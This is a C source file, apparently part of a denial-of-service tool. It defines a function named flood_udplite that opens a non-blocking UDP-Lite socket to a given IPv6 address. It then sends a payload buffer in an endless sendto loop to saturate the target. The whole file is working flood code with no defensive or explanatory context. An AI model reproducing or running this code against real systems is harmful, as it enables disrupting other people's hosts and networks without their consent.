#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "main.h"

int flood_udplite(struct sockaddr_in6 sin) {
  int sock;

  if( (sock = socket(sin.sin6_family, SOCK_DGRAM | SOCK_NONBLOCK, IPPROTO_UDPLITE)) == -1 ) {
    perror("Can't create socket\n");
    return EXIT_FAILURE;
  }
  
  while(sendto(sock, SHIT, sizeof(SHIT), MSG_OOB, (struct sockaddr *)&sin, sizeof(sin)));

  return EXIT_SUCCESS;
}
